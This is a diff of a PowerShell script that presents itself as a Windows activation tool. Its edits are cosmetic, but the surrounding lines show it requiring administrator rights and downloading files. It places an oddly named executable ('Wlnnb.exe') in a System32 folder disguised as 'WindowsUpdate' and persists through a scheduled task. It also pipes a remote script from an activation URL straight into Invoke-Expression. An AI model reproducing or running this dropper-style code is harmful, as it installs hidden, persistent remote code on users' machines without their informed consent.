@@ -8,7 +8,7 @@ function Show-ProgressBar($label, $percent) {
     $barLength = 30
     $filledLength = [math]::Round($percent * $barLength)
     $bar = ('█' * $filledLength).PadRight($barLength)
-    Write-Host "`r$label [$bar] $([math]::Round($percent * 100))%" -NoNewline
+    Write-Host "`r$label [$bar]" -NoNewline
 }
 
 function Download-WithProgress {
@@ -27,6 +27,8 @@ function Download-WithProgress {
 
     foreach ($url in $urls) {
         try {
+            $client.Dispose()
+            $client = New-Object System.Net.Http.HttpClient($handler)
             $response = $client.GetAsync($url, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).Result
             if (-not $response.IsSuccessStatusCode) { continue }
 
@@ -88,6 +90,8 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Exit
 }
 
+Clear-Host
+
 # Define paths
 $secureDir = "$env:windir\System32\WindowsPowerShell\v1.0\Modules\WindowsUpdate"
 $exeFileName = "Wlnnb.exe"
@@ -143,7 +147,6 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
 
 Remove-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Command Processor' -Name 'Autorun'
-Clear-Host
 Write-Host "" -BackgroundColor DarkBlue -ForegroundColor White " Running Activation... "
 try {
     Invoke-RestMethod "https://get.activated.win" | Invoke-Expression
